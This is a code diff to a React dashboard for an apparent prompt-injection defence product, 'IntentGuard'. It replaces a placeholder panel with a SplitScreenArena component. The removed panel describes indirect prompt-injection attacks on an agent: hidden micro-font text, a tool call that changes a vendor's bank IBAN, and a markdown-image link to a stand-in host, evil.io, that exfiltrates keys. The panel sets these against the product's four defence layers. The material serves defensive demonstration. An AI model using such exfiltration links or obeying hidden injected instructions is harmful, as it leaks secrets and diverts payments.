@@ -22,8 +22,8 @@ import {
   CheckCircle2,
   AlertTriangle,
   ArrowRight,
-  ExternalLink,
 } from "lucide-react";
+import { SplitScreenArena } from "../components/SplitScreenArena";
 
 export default function IntentGuardDashboard() {
   const [activeTab, setActiveTab] = useState<DashboardTabId>("arena");
@@ -264,102 +264,7 @@ export default function IntentGuardDashboard() {
         <div className="w-full flex flex-col gap-6">
           {activeTab === "arena" && (
             <div id="tab-arena" className="flex flex-col gap-6">
-              {/* Temporary placeholder container until Task 33 SplitScreenArena is mounted */}
-              <div className="bg-[#FFFFFF] border border-[#E5E4DF] p-6">
-                <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-[#E5E4DF] pb-4">
-                  <div>
-                    <div className="flex items-center gap-2">
-                      <h2 className="text-base font-bold text-[#1C1917] font-mono">
-                        1. SPLIT-SCREEN LIVE ARENA
-                      </h2>
-                      <span className="text-[10px] font-mono px-2 py-0.5 bg-[#FEF2F2] border border-[#FECACA] text-[#991B1B]">
-                        UNPROTECTED OPENCLAW VS INTENTGUARD
-                      </span>
-                    </div>
-                    <p className="text-xs text-[#57534E] mt-1">
-                      Side-by-side execution trace demonstrating indirect prompt injection containment across all 4 defense layers.
-                    </p>
-                  </div>
-                </div>
-
-                <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mt-6">
-                  {/* Left Column Preview */}
-                  <div className="border border-[#FECACA] bg-[#FEF2F2]/30 p-5">
-                    <div className="flex items-center justify-between pb-3 border-b border-[#FECACA]">
-                      <span className="text-xs font-mono font-bold text-[#991B1B]">
-                        BASE AGENT // STANDARD OPENCLAW
-                      </span>
-                      <span className="text-[10px] font-mono bg-[#FEF2F2] text-[#991B1B] px-1.5 py-0.5 border border-[#FECACA]">
-                        VULNERABLE
-                      </span>
-                    </div>
-                    <div className="mt-4 space-y-3 text-xs font-mono text-[#57534E]">
-                      <div className="p-3 bg-[#FFFFFF] border border-[#FECACA]">
-                        <p className="text-[#991B1B] font-semibold">
-                          [VULNERABILITY 1] Raw Parser Ingestion
-                        </p>
-                        <p className="mt-1 text-[11px]">
-                          0.1pt font and white-on-white text ingested into prompt without de-cloaking.
-                        </p>
-                      </div>
-                      <div className="p-3 bg-[#FFFFFF] border border-[#FECACA]">
-                        <p className="text-[#991B1B] font-semibold">
-                          [VULNERABILITY 2] Bank Detail Hijack
-                        </p>
-                        <p className="mt-1 text-[11px]">
-                          Tool executed: change_vendor_bank(iban=&quot;GB99HACK999&quot;) without PO cross-check.
-                        </p>
-                      </div>
-                      <div className="p-3 bg-[#FFFFFF] border border-[#FECACA]">
-                        <p className="text-[#991B1B] font-semibold">
-                          [VULNERABILITY 3] Silent EchoLeak
-                        </p>
-                        <p className="mt-1 text-[11px]">
-                          Markdown image ![leak](https://evil.io/leak?key=...) exfiltrates secrets.
-                        </p>
-                      </div>
-                    </div>
-                  </div>
-
-                  {/* Right Column Preview */}
-                  <div className="border border-[#A7F3D0] bg-[#ECFDF5]/30 p-5">
-                    <div className="flex items-center justify-between pb-3 border-b border-[#A7F3D0]">
-                      <span className="text-xs font-mono font-bold text-[#065F46]">
-                        INTENTGUARD + OPENCLAW // 4-LAYER PROTECTED
-                      </span>
-                      <span className="text-[10px] font-mono bg-[#ECFDF5] text-[#065F46] px-1.5 py-0.5 border border-[#A7F3D0]">
-                        SECURED
-                      </span>
-                    </div>
-                    <div className="mt-4 space-y-3 text-xs font-mono text-[#57534E]">
-                      <div className="p-3 bg-[#FFFFFF] border border-[#A7F3D0]">
-                        <p className="text-[#065F46] font-semibold">
-                          [LAYER 1] Pre-OCR De-Cloaker
-                        </p>
-                        <p className="mt-1 text-[11px]">
-                          0.1pt micro-font detected and stripped. raw_evidence_sha256 computed.
-                        </p>
-                      </div>
-                      <div className="p-3 bg-[#FFFFFF] border border-[#A7F3D0]">
-                        <p className="text-[#065F46] font-semibold">
-                          [LAYER 2] CaMeL Dual-LLM & Redactor
-                        </p>
-                        <p className="mt-1 text-[11px]">
-                          Surgically redacted malicious imperative commands. Clean business invoice preserved.
-                        </p>
-                      </div>
-                      <div className="p-3 bg-[#FFFFFF] border border-[#A7F3D0]">
-                        <p className="text-[#065F46] font-semibold">
-                          [LAYER 3 & 4] IFC Policy & Fabric Audit
-                        </p>
-                        <p className="mt-1 text-[11px]">
-                          HDFC PO-402 matched. 12-field immutable audit event committed to Hyperledger Fabric.
-                        </p>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-              </div>
+              <SplitScreenArena onSwitchTab={setActiveTab} />
             </div>
           )}
 
